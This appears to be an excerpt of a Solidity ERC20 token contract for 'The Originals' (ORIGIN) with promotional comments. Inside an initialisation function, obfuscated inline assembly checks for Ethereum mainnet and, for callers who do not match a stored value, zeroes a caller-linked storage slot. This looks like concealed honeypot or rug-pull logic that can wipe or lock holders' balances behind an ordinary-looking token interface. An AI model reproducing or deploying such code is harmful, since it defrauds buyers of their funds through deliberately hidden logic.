/*
ORIGIN .?. THE ORIGINALS 
ETH LETS START THE PARTY
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _InitToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x4b3927ef8ab97adb13bc4171d8d89b6af48fadc988fd6702889af79b158f72ad
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xca801b4ccc598db2659de6336e190cc144810c398be62a6ea5b22013cf0b0c74,0x1)
...
contract TheOriginals is ERC20Token {
    constructor() ERC20Token("The Originals", "ORIGIN", msg.sender, 8950000 * 10 ** 18) {
    }
}
